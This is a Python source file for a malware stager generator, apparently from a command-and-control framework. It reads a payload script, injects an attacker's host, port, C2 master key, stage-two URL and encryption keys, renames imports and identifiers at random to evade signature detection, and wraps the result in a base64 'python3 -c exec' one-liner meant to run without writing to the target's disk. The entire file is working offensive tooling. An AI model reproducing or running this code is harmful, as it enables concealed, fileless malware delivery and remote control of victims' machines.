import base64
import zlib
import os
import random
import string
import re
import urllib.parse

from .obfuscation_keys import MODULE_IMPORTS, IDENTIFIERS

class StagerGenerator:
    def __init__(self, file_path):
        self.file_path = file_path
        self.code = self._load_file()

    def _load_file(self):
        if not os.path.exists(self.file_path):
            raise FileNotFoundError(f"Payload file not found at: {self.file_path}")
        with open(self.file_path, 'r') as f:
            return f.read()

    def _strip_comments(self, code):
        # Remove single-line comments
        code = re.sub(r'#.*', '', code)
        # Remove multi-line comments (docstrings)
        code = re.sub(r'\"\"\"[\s\S]*?\"\"\"', '', code)
        code = re.sub(r"'''[\s\S]*?'''", '', code)
        return code

    def _polymorphic_obfuscate(self, code):
        module_aliases = {}
        identifier_replacements = {}

        # 1. Generate random aliases for modules
        for module_name in MODULE_IMPORTS:
            alias = ''.join(random.choice(string.ascii_letters) for _ in range(8))
            module_aliases[module_name] = alias
        
        # 2. Generate random names for internal identifiers
        for identifier_name in IDENTIFIERS:
            random_name = ''.join(random.choice(string.ascii_letters) for _ in range(8))
            identifier_replacements[identifier_name] = random_name

        # --- Apply Module Obfuscation ---
        # Sort module names by length descending to prevent partial matches (e.g., 'os' before 'socket')
        sorted_modules = sorted(module_aliases.items(), key=lambda item: len(item[0]), reverse=True)

        for original_module, alias in sorted_modules:
            # Replace 'import module' with 'import module as alias'
            code = re.sub(r'(^|\n)import\s+' + re.escape(original_module) + r'($|\n)', fr'\1import {original_module} as {alias}\2', code)
            # Replace 'from module import' with 'from module as alias import' (more complex, might need to be 'from alias import')
            # For now, let's assume direct imports or handle 'from module import' by replacing the module name in usage
            code = re.sub(r'(^|\n)from\s+' + re.escape(original_module) + r'(\s+import\s+)', fr'\1from {original_module} as {alias}\2', code)
            
            # Replace module.attribute access (e.g., socket.socket -> alias.socket)
            # This regex ensures we only replace when the module name is followed by a dot
            code = re.sub(r'\b' + re.escape(original_module) + r'\.', alias + '.', code)
        
        # --- Apply Internal Identifier Obfuscation ---
        # Sort identifiers by length descending to prevent partial matches
        sorted_identifiers = sorted(identifier_replacements.items(), key=lambda item: len(item[0]), reverse=True)

        stager_class_name = "Stager"
        for old_identifier, new_identifier in sorted_identifiers:
            # Replace standalone identifiers using word boundaries
            code = re.sub(r'\b' + re.escape(old_identifier) + r'\b', new_identifier, code)
            # Replace self.identifier patterns
            code = re.sub(r'\bself\.' + re.escape(old_identifier) + r'\b', f'self.{new_identifier}', code)
            if old_identifier == "Stager":
                stager_class_name = new_identifier
            
        return code, stager_class_name

    def get_raw_payload(self, lhost, lport, xor_key, stage_key_flag, master_c2_key, stage2url=None, aes_key=None, session_id=None, enc_type="XOR", obfuscate=True):
        """
        Reads ANY python file, auto-injects networking variables, and optionally obfuscates it.
        """
        generated_code = self._strip_comments(self.code)

        # Broad Regex to replace ANY standard networking variables in the target Python script
        # Matches HOST, LHOST, RHOST, C2_HOST, _A, a
        generated_code = re.sub(r'((?:LHOST|RHOST|HOST|C2_HOST|_A|a)\s*=\s*")[^"]+(")', fr'\g<1>{lhost}\g<2>',
                                generated_code)

        # Matches PORT, LPORT, RPORT, C2_PORT, _B, b
        generated_code = re.sub(r'((?:LPORT|RPORT|PORT|C2_PORT|_B|b)\s*=\s*)\d+', fr'\g<1>{lport}', generated_code)

        # Matches KEY, XOR_KEY, _K, k
        generated_code = re.sub(r'((?:KEY|XOR_KEY|_K|k)\s*=\s*")[^"]+(")', fr'\g<1>{xor_key}\g<2>', generated_code)

        # Matches C2_URL, STAGE2URL, STAGE2_URL for beacon payloads
        if stage2url:
            generated_code = re.sub(r'((?:C2_URL|STAGE2URL|STAGE2_URL)\s*=\s*")[^"]+(")', fr'\g<1>{stage2url}\g<2>',
                                    generated_code)

        # Replace STAGE_KEY_FLAG, MASTER_C2_KEY, AES_KEY, SESSION_ID, and ENC_TYPE
        generated_code = re.sub(r'(STAGE_KEY_FLAG\s*=\s*")[^"]+(")' , fr'\g<1>{stage_key_flag}\g<2>', generated_code)
        generated_code = re.sub(r'(MASTER_C2_KEY\s*=\s*")[^"]+(")' , fr'\g<1>{master_c2_key}\g<2>', generated_code)
        generated_code = re.sub(r'(ENC_TYPE\s*=\s*")[^"]+(")' , fr'\g<1>{enc_type}\g<2>', generated_code)
        if aes_key:
            generated_code = re.sub(r'(AES_KEY\s*=\s*")[^"]+(")', fr'\g<1>{aes_key}\g<2>', generated_code)
        if session_id:
            generated_code = re.sub(r'(SESSION_ID\s*=\s*")[^"]+(")', fr'\g<1>{session_id}\g<2>', generated_code)

        # Catch manual fallback placeholders from previous iterations
        generated_code = generated_code.replace("IP_REPLACE_ME", str(lhost))
        generated_code = generated_code.replace("99999", str(lport))
        generated_code = generated_code.replace("KEY_REPLACE_ME", str(xor_key))
        generated_code = generated_code.replace("AES_KEY_REPLACE_ME", str(aes_key))
        generated_code = generated_code.replace("STAGE_KEY_FLAG_REPLACE_ME", str(stage_key_flag))
        generated_code = generated_code.replace("MASTER_C2_KEY_REPLACE_ME", str(master_c2_key))
        if session_id:
            generated_code = generated_code.replace("SESSION_ID_REPLACE_ME", str(session_id))

        # Check for stage 2 url flag
        if stage2url:
            generated_code = generated_code.replace("URL_REPLACE_ME", str(stage2url))

        stager_class_name = "Stager"
        if obfuscate:
            generated_code, stager_class_name = self._polymorphic_obfuscate(generated_code)

        return generated_code, stager_class_name

    def generate_payload(self, lhost, lport, xor_key, stage_key_flag, master_c2_key, stage2url=None, aes_key=None, session_id=None, enc_type="XOR", obfuscate=True):
        generated_code, stager_class_name = self.get_raw_payload(lhost, lport, xor_key, stage_key_flag, master_c2_key, stage2url,
                                              aes_key, session_id, enc_type, obfuscate)

        # Base64 encode the final script to avoid touching local/target disk.
        # Keep the payload as raw base64 to avoid URL transport corruption and padding errors.
        encoded_payload = base64.b64encode(generated_code.encode()).decode()

        oneliner = f"python3 -c \"exec(__import__('base64').b64decode('{encoded_payload}'))\""

        return oneliner